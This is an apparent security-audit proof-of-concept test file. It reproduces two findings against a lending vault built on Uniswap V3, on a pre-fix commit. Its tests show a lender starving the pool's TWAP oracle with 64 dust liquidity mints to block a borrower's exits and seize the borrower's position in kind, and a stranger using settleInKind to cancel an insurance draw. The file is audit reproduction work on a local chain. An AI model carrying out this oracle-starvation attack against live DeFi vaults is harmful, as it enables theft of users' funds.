// Krait re-run PoC (KRAIT-004, KRAIT-005) against REAL Uniswap V3.
// Reproduces the findings on commit 089ce71, before the fixes. On later
// commits test 1 fails at the borrower's entry (the fix) and test 3 at
// settleInKind ("Everything sold - use settle()"). To run it against 089ce71:
//   git checkout 089ce71
//   cp .audit/poc/KraitObservationPoC.test.js test/
//   npx hardhat test test/KraitObservationPoC.test.js
const { expect } = require("chai");
const { time } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

const FACTORY_ARTIFACT = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
const POOL_ARTIFACT    = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
const ROUTER_ARTIFACT  = require("@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json");

const E = ethers.parseEther;
const FEE = 3000;
const SQRT_PRICE_1_1 = 79228162514264337593543950336n;
const CARDINALITY = 64;          // what scripts/deploy-uniswap-testnet.js uses
const WINDOW = 1800;             // AssetRegistry default (and the production minimum)

async function stack() {
  const [operator, lender, borrower, attackerHelper] = await ethers.getSigners();
  const Mock = await ethers.getContractFactory("MockERC20", operator);
  const weth = await Mock.deploy("WETH", "WETH", 18);
  const x    = await Mock.deploy("Tokenised stock", "XSTK", 18);

  const uniFactory = await new ethers.ContractFactory(FACTORY_ARTIFACT.abi, FACTORY_ARTIFACT.bytecode, operator).deploy();
  const router = await new ethers.ContractFactory(ROUTER_ARTIFACT.abi, ROUTER_ARTIFACT.bytecode, operator)
    .deploy(ethers.ZeroAddress, await uniFactory.getAddress(), ethers.ZeroAddress, await weth.getAddress());
  await uniFactory.createPool(await weth.getAddress(), await x.getAddress(), FEE);
  const pool = new ethers.Contract(await uniFactory.getPool(await weth.getAddress(), await x.getAddress(), FEE), POOL_ARTIFACT.abi, operator);
  await pool.initialize(SQRT_PRICE_1_1);

  const helper = await (await ethers.getContractFactory("UniswapLiquidityHelper", operator)).deploy();
  await weth.mint(await helper.getAddress(), E("10000000"));
  await x.mint(await helper.getAddress(), E("10000000"));
  await helper.addFullRangeLiquidity(await pool.getAddress(), 10n ** 23n);   // ~100k of each: deep
  await helper.warmUpOracle(await pool.getAddress(), CARDINALITY);

  // Anyone's swap helper (used by the lender to write observations).
  async function dustSwap(signer) {
    await weth.mint(signer.address, E("1"));
    await weth.connect(signer).approve(await router.getAddress(), ethers.MaxUint256);
    await router.connect(signer).exactInputSingle({
      tokenIn: await weth.getAddress(), tokenOut: await x.getAddress(), fee: FEE,
      recipient: signer.address, amountIn: 1000n, amountOutMinimum: 0n, sqrtPriceLimitX96: 0n,
    });
  }
  // Build honest history: observations spread over more than the window.
  for (let i = 0; i < 4; i++) { await dustSwap(operator); await time.increase(700); }

  const id = await (await ethers.getContractFactory("MockIdentityAdapter", operator)).deploy();
  await id.set(lender.address, 7); await id.set(borrower.address, 7);
  const registry = await (await ethers.getContractFactory("AssetRegistry", operator)).deploy(
    operator.address, await router.getAddress(), await uniFactory.getAddress(), 0);
  await registry.addAssetWithTier(await weth.getAddress(), 0, 0);
  await registry.addAssetWithTier(await x.getAddress(), 0, 0);
  await registry.setPoolFeeTier(await weth.getAddress(), await x.getAddress(), FEE);
  await registry.setOutageConfig(0, 0, 0);                  // no heartbeat bot needed for the PoC

  const ipool = await (await ethers.getContractFactory("InsurancePool", operator)).deploy(operator.address, 1000, 0);
  const twapLib = await (await ethers.getContractFactory("UniswapTwap", operator)).deploy();
  const impl = await (await ethers.getContractFactory("Vault", { signer: operator, libraries: { UniswapTwap: await twapLib.getAddress() } })).deploy();
  const factory = await (await ethers.getContractFactory("VaultFactory", operator)).deploy(
    await id.getAddress(), await registry.getAddress(), await ipool.getAddress(), operator.address, await impl.getAddress(), 0);
  await ipool.setVaultFactory(await factory.getAddress());

  // Lender originates 10 WETH, BlueChip, 7 days; borrower pays the deposit.
  const P = E("10");
  await weth.mint(lender.address, P);
  await weth.connect(lender).approve(await factory.getAddress(), P);
  const D = await factory.quoteMinimumDeposit(P, 0, 7, false);
  await factory.connect(lender).deployVaultWithTier(await weth.getAddress(), borrower.address, P, 1000, 7, false, D, ethers.ZeroAddress, 0);
  const vault = await ethers.getContractAt("Vault", await factory.allVaults(0));
  const prem = await vault.insurancePremium();
  await weth.mint(borrower.address, D + prem);
  await weth.connect(borrower).approve(await vault.getAddress(), D + prem);
  await vault.connect(borrower).payDeposit();

  // Borrower takes a 9 WETH position in X — a normal, fully-checked entry.
  await vault.connect(borrower).swap(await x.getAddress(), E("9"), 1n, FEE);

  // The lender's own liquidity helper: a dust full-range mint writes one
  // observation without moving the price (a swap only writes one when it
  // crosses a tick).
  const lenderHelper = await (await ethers.getContractFactory("UniswapLiquidityHelper", lender)).deploy();
  await weth.mint(await lenderHelper.getAddress(), E("1"));
  await x.mint(await lenderHelper.getAddress(), E("1"));
  async function dustMint(signer) {
    await lenderHelper.connect(signer).addFullRangeLiquidity(await pool.getAddress(), 1000n);
  }

  return { operator, lender, borrower, attackerHelper, weth, x, pool, router, registry, vault, P, D, dustSwap, dustMint, lenderHelper };
}

// Write CARDINALITY observations at distinct seconds: the ring then holds no
// observation older than the window, and pool.observe([WINDOW, 0]) reverts "OLD".
async function starveOracle(ctx, who) {
  for (let i = 0; i < CARDINALITY; i++) { await ctx.dustMint(who); }   // automine: one block (and second) each
}

describe("KRAIT re-run PoC — observation starvation", function () {
  this.timeout(600000);

  it("A lender can block every exit, then take the borrower's whole position in kind", async function () {
    const ctx = await stack();
    const { lender, borrower, x, weth, pool, vault, P } = ctx;
    const held = await vault.heldAmount(await x.getAddress());
    console.log("    held X:", ethers.formatEther(held), " cash in vault:", ethers.formatEther(await weth.balanceOf(await vault.getAddress())));

    // Honest baseline: the oracle serves a 30-minute TWAP.
    await pool.observe([WINDOW, 0]);

    // 1. Shortly before the deadline the lender writes 64 observations.
    await time.increaseTo((await vault.deadline()) - 200n);
    await starveOracle(ctx, lender);
    await expect(pool.observe([WINDOW, 0])).to.be.revertedWith("OLD");

    // The borrower can no longer exit: swapBack and an early close both need the TWAP.
    await expect(vault.connect(borrower).swapBack(await x.getAddress(), held, 1n)).to.be.reverted;
    await expect(vault.connect(borrower).settle()).to.be.reverted;

    // 2. After the deadline nobody can settle while the lender keeps the ring fresh.
    await time.increaseTo((await vault.deadline()) + 10n);
    await starveOracle(ctx, lender);
    await expect(vault.connect(borrower).settle()).to.be.reverted;
    await expect(vault.connect(lender).settle()).to.be.reverted;

    // 3. The lender keeps that up until in-kind settlement opens (cost: 64 dust
    //    swaps per 30 minutes; sampled here, not every window), then settles in
    //    kind during the lender-only period with the oracle starved.
    await time.increaseTo(await vault.inKindFrom());
    await starveOracle(ctx, lender);
    expect(await vault.isSettled()).to.equal(false);

    const owed = P + (await vault.fullTermFee());
    const xBefore = await x.balanceOf(lender.address);
    await vault.connect(lender).settleInKind();
    const xToLender = (await x.balanceOf(lender.address)) - xBefore;
    const xToBorrower = await x.balanceOf(borrower.address);

    // Value at the honest 1:1 price: the lender was owed `owed`.
    const cashToLender = await vault.settledLenderPayout();
    const lenderValue = cashToLender + xToLender;   // X ≈ 1 WETH
    console.log("    owed to lender:      ", ethers.formatEther(owed));
    console.log("    lender received:      cash", ethers.formatEther(cashToLender), "+ X", ethers.formatEther(xToLender));
    console.log("    borrower received X: ", ethers.formatEther(xToBorrower));
    console.log("    lender over-collects:", ethers.formatEther(lenderValue - owed));

    expect(xToBorrower).to.equal(0n);                 // the borrower's equity is gone
    expect(lenderValue - owed).to.be.greaterThan(E("0.5"));
  });

  it("Control: with the oracle healthy the same in-kind close splits the position fairly", async function () {
    const ctx = await stack();
    const { lender, borrower, x, vault } = ctx;
    await time.increaseTo(await vault.inKindFrom());
    // settle() would work here; settleInKind sells everything and pays cash.
    await vault.connect(lender).settleInKind();
    expect(await x.balanceOf(lender.address)).to.equal(0n);
    expect(await vault.settledBorrowerPayout()).to.be.greaterThan(0n);
  });

  it("C-2: once the lender period ends, anyone can pick settleInKind over settle and cancel a lender's insurance draw", async function () {
    async function lossVault() {
      const ctx = await stack();
      const { operator, weth, x, router, vault } = ctx;
      const ipool = await ethers.getContractAt("InsurancePool", await vault.insurancePool());
      await weth.mint(operator.address, E("100"));
      await weth.approve(await ipool.getAddress(), E("100"));
      await ipool.fund(await weth.getAddress(), E("100"));
      // X falls ~35%: someone sells X into the pool, and the TWAP catches up.
      await x.mint(operator.address, E("50000"));
      await x.approve(await router.getAddress(), ethers.MaxUint256);
      await router.exactInputSingle({ tokenIn: await x.getAddress(), tokenOut: await weth.getAddress(), fee: FEE,
        recipient: operator.address, amountIn: E("25000"), amountOutMinimum: 0n, sqrtPriceLimitX96: 0n });
      await time.increase(WINDOW * 2);
      return ctx;
    }
    // Control: the lender (or anyone) settles normally after the in-kind windows.
    let c = await lossVault();
    await time.increaseTo((await c.vault.inKindFrom()) + 7n * 86400n);
    await c.vault.connect(c.attackerHelper).settle();
    const drawNormal = await c.vault.settledInsuranceDraw();
    const lenderNormal = await c.vault.settledLenderPayout();
    // Same vault state, but a stranger calls settleInKind: every asset sells, nothing is in kind.
    c = await lossVault();
    await time.increaseTo((await c.vault.inKindFrom()) + 7n * 86400n);
    await c.vault.connect(c.attackerHelper).settleInKind();
    console.log("    settle():       lender", ethers.formatEther(lenderNormal), " draw", ethers.formatEther(drawNormal));
    console.log("    settleInKind(): lender", ethers.formatEther(await c.vault.settledLenderPayout()), " draw 0, nothing handed over in kind:",
      (await c.x.balanceOf(c.lender.address)) == 0n);
    expect(drawNormal).to.be.greaterThan(0n);
    expect(await c.vault.settledLenderPayout()).to.equal(lenderNormal - drawNormal);
  });
});

